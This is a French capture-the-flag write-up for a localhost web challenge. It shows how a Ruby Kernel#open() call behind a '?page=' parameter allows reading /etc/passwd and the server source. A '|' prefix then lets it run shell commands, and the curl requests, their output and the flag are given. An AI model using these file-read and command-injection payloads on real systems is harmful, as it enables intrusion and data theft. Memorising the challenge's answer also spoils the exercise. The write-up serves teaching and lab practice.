# Pipe Guide

## Description

Vous trouverez ici mon tout premier site sur les tubes! Je suis très passionné par les tubes ...

http://127.0.0.1:6009

## Solution

Le but de ce défi était de démontrer les mauvaises utilisations de la fonction Kernel#open().

En visitant le site web, on peut remarquer le paramètre `?page=home.html`, qui sous-entend
que ce site est peut-être vulnérable à de la lecture arbitraire de fichier.

On peut tester cette hypothèse en visitant http://127.0.0.1:6009/?page=/etc/passwd, qui nous
permet d'exfiltrer le contenu du fichier /etc/passwd sur le serveur.

On peut aussi remarquer le commentaire HTML dans le bas de la page :
```
  <!-- My website source code : /?page=web.rb -->
```

qui nous permet de lire le code source du serveur.

La fonction Kernel#open() permet d'ouvrir un fichier en lecture/écriture. En lisant la
[documentation](https://ruby-doc.org/core-2.6.3/Kernel.html#method-i-open) de la fonction, on apprend que open() peut aussi être utilisé pour faire une copie du processus courant (fork) et d'exécuter des commandes quand le fichier à ouvrir commence par un `|`.

Ainsi on peut trouver et exécuter le fichier qui va nous donner le flag :
```
$ curl 'http://127.0.0.1:6009/?page=|ls%20-lah%20/'
total 96K
drwxr-xr-x   1 root root 4.0K Aug 14 19:20 .
drwxr-xr-x   1 root root 4.0K Aug 14 19:20 ..
-rwxr-xr-x   1 root root    0 Aug 14 19:20 .dockerenv
drwxr-xr-x   1 root root 4.0K May  4  2018 bin
drwxr-xr-x   2 root root 4.0K Feb 23  2018 boot
drwxr-xr-x   5 root root  340 Aug 14 19:33 dev
drwxr-xr-x   1 root root 4.0K Aug 14 19:20 etc
---s--x--x   1 root root  17K Aug 14 19:20 ex3cute_m3_to_g3t_th3_fl4g
drwxr-xr-x   2 root root 4.0K Feb 23  2018 home
drwxr-xr-x   1 root root 4.0K May  4  2018 lib
drwxr-xr-x   2 root root 4.0K Apr 26  2018 lib64
drwxr-xr-x   2 root root 4.0K Apr 26  2018 media
drwxr-xr-x   2 root root 4.0K Apr 26  2018 mnt
drwxr-xr-x   2 root root 4.0K Apr 26  2018 opt
dr-xr-xr-x 183 root root    0 Aug 14 19:33 proc
drwx------   1 root root 4.0K May  5  2018 root
drwxr-xr-x   4 root root 4.0K Apr 26  2018 run
drwxr-xr-x   1 root root 4.0K May  4  2018 sbin
drwxr-xr-x   2 root root 4.0K Apr 26  2018 srv
-rw-r--r--   1 root root  311 May  6  2018 startup.sh
dr-xr-xr-x  13 root root    0 Aug 14 19:03 sys
drwxrwxrwt   1 root root 4.0K Aug 14 19:20 tmp
drwxr-xr-x   1 root root 4.0K May  6  2018 usr
drwxr-xr-x   1 root root 4.0K Apr 26  2018 var

$ curl 'http://127.0.0.1:6009/?page=|/ex3cute_m3_to_g3t_th3_fl4g'
flag{open()==fork()==system()}
```

## Flag

`flag{open()==fork()==system()}`

